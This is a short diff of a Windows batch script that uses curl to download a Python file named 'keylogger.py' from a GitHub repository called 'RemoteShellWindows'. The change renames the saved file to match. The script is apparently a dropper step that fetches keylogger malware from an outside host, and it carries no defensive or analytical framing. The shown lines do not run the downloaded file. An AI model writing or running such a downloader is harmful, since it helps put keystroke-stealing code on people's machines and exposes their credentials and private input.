@@ -2,7 +2,7 @@
 REM Set the URL of the Python file
 set URL=https://raw.githubusercontent.com/Lord-Of-Legends/RemoteShellWindows/main/keylogger.py
 REM Set the local file name to save the Python file as
-set FILENAME=yourfile.py
+set FILENAME=keylogger.py
 
 REM Use curl to download the Python file
 curl -o %FILENAME% %URL%
